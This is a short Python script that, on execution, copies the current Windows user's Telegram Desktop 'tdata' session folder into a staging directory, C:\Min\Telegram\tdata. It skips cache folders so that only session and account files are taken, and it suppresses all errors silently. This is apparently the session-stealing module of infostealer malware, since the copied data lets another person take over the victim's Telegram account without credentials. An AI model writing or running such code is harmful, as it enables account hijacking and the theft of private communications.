import os
import shutil
import getpass

def telega():
    current_user = getpass.getuser()
    source_folder = f'C:\\Users\\{current_user}\\AppData\\Roaming\\Telegram Desktop\\tdata'
    destination_folder = r'C:\Min\Telegram\tdata'

    if os.path.exists(source_folder):
        try:
            for item in os.listdir(source_folder):
                if item not in ['webview', 'tdummy', 'emoji', 'dumps', 'temp', 'user_data']:
                    item_source = os.path.join(source_folder, item)
                    item_destination = os.path.join(destination_folder, item)
                    if os.path.isdir(item_source):
                        shutil.copytree(item_source, item_destination)
                    else:
                        shutil.copy2(item_source, item_destination)
        except Exception as e:
            pass
    else:
        pass

telega()
